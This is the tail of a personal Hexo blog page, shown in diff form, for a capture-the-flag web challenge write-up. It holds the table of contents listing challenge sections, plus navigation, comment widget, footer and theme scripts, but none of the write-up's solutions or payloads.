+    <p><strong><span class="icon-calendar icon"></span>Updated: </strong>2026-07-31 21:29:33</p>
+    <p><strong><span class="icon-copyright icon"></span>License: </strong>All articles on this blog are licensed under the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener nofollow noreferrer" target="_blank"><span class="icon-creative-commons"></span>BY-NC-SA</a> license agreement unless otherwise stated. Please indicate the source when reprinting!</p>
+    <span class="icon-creative-commons article-copyright-bg"></span>
+  </blockquote>
+        <div class="share-wrapper">
+    <a href="https://service.weibo.com/share/share.php?url=https%3A%2F%2Fcl1ck-t0.github.io%2F2026%2F07%2F21%2Fctfshow-web-wp%2F&amp;appkey=&amp;title=ctfshow-web-wp&amp;pic=&amp;ralateUid=" target="_blank" rel="noopener noreferrer" title="ctfshow-web-wp">
+      <div class="share-icon icon icon-weibo">
+      </div>
+    </a>
+    <a href="https://connect.qq.com/widget/shareqq/index.html?url=www.baidu.com&amp;title=ctfshow-web-wp&amp;desc=ctfshow-web-wp&amp;source=https%3A%2F%2Fcl1ck-t0.github.io" target="_blank" rel="noopener noreferrer" title="ctfshow-web-wp">
+      <div class="share-icon icon icon-qq">
+      </div>
+    </a>
+    <a href="javascript:;"  title="ctfshow-web-wp">
+      <div class="share-icon icon icon-weixin">
+          <div id="share-weixin">
+            <div class="share-weixin-dom">
+              <div class="share-weixin-content">
+                <img id="share-weixin-banner"> 
+                <div id="share-weixin-title"></div>
+                <div id="share-weixin-desc"></div>
+              </div>
+              <div class="share-weixin-qrcode">
+                <div class="share-weixin-info">
+                  <div id="share-weixin-author"></div>
+                  <div id="share-weixin-theme">Powered By hexo-theme-reimu</div>
+                </div>
+                <img id="share-weixin-qr" >
+              </div>
+            </div>
+            <div class="share-weixin-canvas"></div>
+          </div>
+      </div>
+    </a>
+</div>
+      
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/web/" rel="tag" title="web">web</a></li></ul>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/covers/6b30891ec859ad095e8049c0da839fa3.jpg" data-sizes="auto" alt="ctfshow-crypto-wp" class="lazyload">
+        <a href="/2026/07/27/ctfshow-crypto-wp/" aria-label="Prev: ctfshow-crypto-wp" title="Prev: ctfshow-crypto-wp"></a>
+        <div class="article-nav-caption">Prev</div>
+        <h3 class="article-nav-title">
+            ctfshow-crypto-wp
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="/covers/5c55270069f3cb0f93ecd584ea2a6155.jpg" data-sizes="auto" alt="Web入门——爆破" class="lazyload">
+      <a href="/2026/07/20/Web%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E7%88%86%E7%A0%B4/" aria-label="Next: Web入门——爆破"  title="Next: Web入门——爆破"></a>
+      <div class="article-nav-caption">Next</div>
+      <h3 class="article-nav-title">
+          Web入门——爆破
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+  <section id="comments" data-aos="fade-up">
+    <div class="comment-header">
+        
+      <h2 class="comment-title">Leave a comment</h2>
+      <div class="comment-selector">
+        <div class="comment-selector-wrap">
+            <div class="selector-item" data-selector="utterances">
+              <span>utterances</span>
+            </div>
+        </div>
+      </div>
+    </div>
+    <div class="comment-content">
+          <div class="comment utterances-comment" data-aos="fade-up"
+            id="utterances-comment">
+          </div>
+    </div>
+  </section>
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        &nbsp;
+      Cl1ck-t0
+    </div>
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        67.8k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        05:11
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ctfshow-web-wp"><span class="toc-number">1.</span> <span class="toc-text"> ctfshow-web-wp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.1.</span> <span class="toc-text"> 一、命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1web29"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 1.web29</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2web30"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 2.web30</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3web38"><span class="toc-number">1.1.3.</span> <span class="toc-text"> 3.web38</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4web74"><span class="toc-number">1.1.4.</span> <span class="toc-text"> 4.web74</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.2.</span> <span class="toc-text"> 二、文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1web151"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 1.web151</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2web152"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 2.web152</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3web153"><span class="toc-number">1.2.3.</span> <span class="toc-text"> 3.web153</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4web154"><span class="toc-number">1.2.4.</span> <span class="toc-text"> 4.web154</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5web155"><span class="toc-number">1.2.5.</span> <span class="toc-text"> 5.web155</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.</span> <span class="toc-text"> 三、SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1web171"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 1.web171</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2web172"><span class="toc-number">1.3.2.</span> <span class="toc-text"> 2.web172</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3web173"><span class="toc-number">1.3.3.</span> <span class="toc-text"> 3.web173</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4web174"><span class="toc-number">1.3.4.</span> <span class="toc-text"> 4.web174</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5web175"><span class="toc-number">1.3.5.</span> <span class="toc-text"> 5.web175</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6web176"><span class="toc-number">1.3.6.</span> <span class="toc-text"> 6.web176</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7web177"><span class="toc-number">1.3.7.</span> <span class="toc-text"> 7.web177</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8web178"><span class="toc-number">1.3.8.</span> <span class="toc-text"> 8.web178</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9web179"><span class="toc-number">1.3.9.</span> <span class="toc-text"> 9.web179</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10web180"><span class="toc-number">1.3.10.</span> <span class="toc-text"> 10.web180</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11web181"><span class="toc-number">1.3.11.</span> <span class="toc-text"> 11.web181</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B-xss"><span class="toc-number">1.4.</span> <span class="toc-text"> 四、xss</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1web316"><span class="toc-number">1.4.1.</span> <span class="toc-text"> 1.web316</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2web317"><span class="toc-number">1.4.2.</span> <span class="toc-text"> 2.web317</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3web318319"><span class="toc-number">1.4.3.</span> <span class="toc-text"> 3.web318&amp;319</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4web320-326"><span class="toc-number">1.4.4.</span> <span class="toc-text"> 4.web320-326</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5web327"><span class="toc-number">1.4.5.</span> <span class="toc-text"> 5.web327</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94-java"><span class="toc-number">1.5.</span> <span class="toc-text"> 五、java</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1web279"><span class="toc-number">1.5.1.</span> <span class="toc-text"> 1.web279</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2web280"><span class="toc-number">1.5.2.</span> <span class="toc-text"> 2.web280</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3web281"><span class="toc-number">1.5.3.</span> <span class="toc-text"> 3.web281</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD-ssti"><span class="toc-number">1.6.</span> <span class="toc-text"> 六、SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1web361"><span class="toc-number">1.6.1.</span> <span class="toc-text"> 1.web361</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2web362"><span class="toc-number">1.6.2.</span> <span class="toc-text"> 2.web362</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83-ssrf"><span class="toc-number">1.7.</span> <span class="toc-text"> 七、SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1web351"><span class="toc-number">1.7.1.</span> <span class="toc-text"> 1.web351</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2web352"><span class="toc-number">1.7.2.</span> <span class="toc-text"> 2.web352</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Cl1ck-t0" class="lazyload">
+  <div class="sidebar-author-name">Cl1ck-t0</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">32</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">20</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-rss sidebar-social-icon">
+      <a href=/atom.xml itemprop="url" target="_blank" aria-label="rss" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+        <div class="sidebar-menu-link">Friend</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/atom.xml" aria-label="rss"></a>
+        <div class="sidebar-menu-link">rss</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+  
+<script src="https://npm.webcache.cn/theme-shokax-pjax@0.0.3/dist/index.umd.js" integrity="sha384-xneY1WY8hOfUzswrE4CrYq35N4BdVcxqxwHPr9zawE&#x2F;jMSCxD+jAPU55x&#x2F;jj3wlf" crossorigin="anonymous"></script>
+
+  
+<script src="/js/pjax.js"></script>
+
+
+
+
+  
+<script src="https://npm.webcache.cn/quicklink@3.0.1/dist/quicklink.umd.js" integrity="sha384-caMDqvgav&#x2F;HWdEYQU1QRRHMLleigpL1YHAG0m371DhzfL8rRzUyOb+bEHtwlmYjD" crossorigin="anonymous"></script>
+
+  <script data-pjax>
+    window.quicklink?.listen({
+      timeout: 3000,
+      priority: true,
+      ignores: []
+    });
+  </script>
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "Cl1ck-t0",
+          title: "ctfshow-web-wp",
+          url: "https://cl1ck-t0.github.io/2026/07/21/ctfshow-web-wp/",
+          excerpt: "",
+          description: "",
+          stripContent: " ctfshow-web-wp ctfshow web入门篇（部分）  一、命令执行  1.web29 1234567891011121314151617181920212223&amp;lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 00:26:48# @email: h1xa",
+          date: "Tue Jul 21 2026 10:01:34 GMT+0800",
+          updated: "Fri Jul 31 2026 21:29:33 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/js/tabs.js" data-pjax defer></script>
+
+        
+<script src="https://npm.webcache.cn/@zumer/snapdom@1.9.14/dist/snapdom.min.js" integrity="sha384-OEQ+fJp&#x2F;Mvi2uzBREXybtxryJvLytWapuHu4EE6LPwTKUwATYcc55tPPcZTzVcmx" crossorigin="anonymous" defer data-pjax></script>
+
+        
+<script src="https://npm.webcache.cn/qrcode@1.5.1/build/qrcode.js" integrity="sha384-VT1EeewTCEXgndcPMQ0PzV+uVFYjxFIjmAA7s5gcMX9t4Dt5TD+OVQIn7NJWIXn7" crossorigin="anonymous" defer data-pjax></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+<script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+
+  var commentConfigKeys = ["utterances"];
+  var commentConfig = {
+    utterances: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.utterances-comment'); 
+        if (!container) return;
+        container.style.display = 'block';
+
+        let theme = 'auto';
+        const parsedTheme = theme === 'auto' ? (document.documentElement.getAttribute('data-theme') === 'dark' ? 'github-dark' : 'github-light') : theme;
+
+        // 创建 utterances 脚本
+        const script = document.createElement('script');
+        script.src = 'https://utteranc.es/client.js';
+        script.setAttribute('repo', 'Cl1ck-t0/Cl1ck-t0.github.io');
+        script.setAttribute('issue-term', 'title');
+        script.setAttribute('theme', parsedTheme);
+        script.setAttribute('crossorigin', 'anonymous');
+        script.async = true;
+
+        // 清空容器（防止重复加载）并插入脚本
+        container.innerHTML = '';
+        container.appendChild(script);
+        if (theme === 'auto') {
+          const themeHandler = (e) => {
+            const iframe = container.querySelector('iframe.utterances-frame');
+            if (!iframe || !iframe.contentWindow) {
+              document.body.removeEventListener('reimu:theme-set', themeHandler);
+              return;
+            }
+            iframe.contentWindow.postMessage({ type: 'set-theme', theme: e.detail.isDark ? 'github-dark' : 'github-light' }, 'https://utteranc.es');
+          };
+          document.body.addEventListener('reimu:theme-set', themeHandler);
+        }
+      }
+    },
+  }
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig[key].enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    // 1. 首先检查localStorage中是否有保存的评论类型
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    // 2. 如果localStorage中有值且对应的评论系统可用，就使用它
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    // 3. 如果localStorage无效，检查配置的默认评论系统
+    if (!defaultComment) {
+      var configDefault = 'waline';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    // 4. 如果前两项都无效，按指定顺序找到第一个可用的评论系统
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig[sys].enable) || '';
+    }
+  }
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false
+    };
+
+    // 隐藏所有评论容器
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    // 按需加载评论系统
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        // 如果已加载，只需显示对应容器
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      // 根据类型加载对应的脚本
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    // 评论组件选择器
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      // 获取要加载的评论系统类型
+      const commentType = item.getAttribute('data-selector');
+
+      // 隐藏所有评论系统
+      hideAllComments();
+
+      // 加载选中的评论系统
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      // 评论组件选择器点击事件
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          // 保存选择器状态
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          // 切换选中状态
+          changeActiveCommentItems(item);
+        });
+      }
+
+      // 检查是否需要加载默认评论系统
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script>
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+    <script>
+      var setupAPlayer = () => {
+        if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+          if (window.matchMedia('(max-width: 959px)').matches) {
+            const meting = _$('meting-js');
+            if (meting) {
+              meting.setAttribute('fixed', 'true');
+              const aside = meting.parentNode?.parentNode;
+              if (aside?.tagName === 'ASIDE') {
+                meting.parentNode.removeChild(meting);
+                document.body.appendChild(meting);
+              }
+            }
+          }
+        }
+      };
+    </script>
+  
+<script src="https://npm.webcache.cn/aplayer@1.10.1/dist/APlayer.min.js" integrity="sha384-gdGYZwHnfJM54evoZhpO0s6ZF5BQiybkiyW7VXr+h5UfruuRL&#x2F;aORyw+5+HZoU6e" crossorigin="anonymous" defer onload="setupAPlayer()"></script>
+
+    
+<script src="https://npm.webcache.cn/meting@2.0.1/dist/Meting.min.js" integrity="sha384-ASVlpKF80A22OXTK3tfEjZm1EL6uFMKIC4p8+0maanw1S&#x2F;IyB+Y4JG+ZDU7GpKE8" crossorigin="anonymous" defer></script>
+
+
+
+  </body>
+  </html>
